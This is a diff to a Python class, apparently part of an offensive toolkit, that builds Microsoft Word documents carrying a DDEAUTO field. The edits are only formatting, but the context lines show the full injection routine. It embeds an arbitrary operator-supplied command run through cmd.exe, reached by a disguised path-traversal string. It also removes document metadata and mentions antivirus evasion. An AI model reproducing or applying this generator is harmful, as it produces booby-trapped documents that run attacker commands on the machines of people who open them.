@@ -23,23 +23,23 @@ class WordDDE(WordGenerator):
         logging.info(" [+] Generating MS Word with DDE document...")
         try:
             # Get command line
-            paramDict = OrderedDict([("Cmd_Line",None)])      
+            paramDict = OrderedDict([("Cmd_Line",None)])
             self.fillInputParams(paramDict)
             command = paramDict["Cmd_Line"]
-            
+
             logging.info("   [-] Open document...")
             # open up an instance of Word with the win32com driver
             word = win32com.client.Dispatch("Word.Application")
             # do the operation in background without actually opening Excel
             word.Visible = False
             document = word.Documents.Open(self.outputFilePath)
-    
+
             logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
-            
+
             ddeCmd = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command.rstrip()
             wdFieldDDEAuto=46
             document.Fields.Add(Range=word.Selection.Range,Type=wdFieldDDEAuto, Text=ddeCmd, PreserveFormatting=False)
-            
+
             # save the document and close
             word.DisplayAlerts=False
             # Remove Informations
@@ -52,8 +52,11 @@ class WordDDE(WordGenerator):
             word.Application.Quit()
             # garbage collection
             del word
-            
-            logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
+
+            logging.info(
+                f"   [-] Generated {self.outputFileType} file path: {self.outputFilePath}"
+            )
+
         except Exception:
             logging.exception(" [!] Exception caught!")
             logging.error(" [!] Hints: Check if MS office is really closed and Antivirus did not catch the files")
